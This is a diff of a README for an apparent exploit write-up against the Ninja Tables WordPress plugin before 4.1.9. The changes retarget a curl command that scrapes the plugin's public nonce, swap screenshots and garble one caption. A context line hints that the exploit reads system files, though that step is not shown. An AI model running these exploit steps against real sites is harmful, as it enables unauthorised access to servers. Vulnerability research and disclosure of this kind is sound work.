@@ -14,13 +14,17 @@ The Ninja Tables plugin for WordPress (versions < 4.1.9) contains a critical vul
 ### 1. **Extract the Nonce**
 
 ```bash
-curl -s https://redacted.com | grep -oP '"ninja_table_public_nonce":"\K[a-z0-9]+'
+curl -s https://target.com | grep -oP '"ninja_table_public_nonce":"\K[a-z0-9]+'
 ```
 
-Example output:
+ like output:
 ```
 3d22ded27c
 ```
+
+<img width="3024" height="1964" alt="image" src="https://github.com/user-attachments/assets/14e7480a-867a-4e0c-b797-79a83f355174" />
+
+
 
 ---
 
@@ -66,7 +70,7 @@ ID=ubuntu
 
 
 
-<img width="3024" height="1964" alt="image" src="https://github.com/user-attachments/assets/f7b50438-fc9d-424d-932b-79c438e49aea" />
+<img width="3024" height="1964" alt="image" src="https://github.com/user-attachments/assets/16bf77bc-e09a-4b3f-9494-2ae123df80a9" />
 
 ####  Raw Request
 
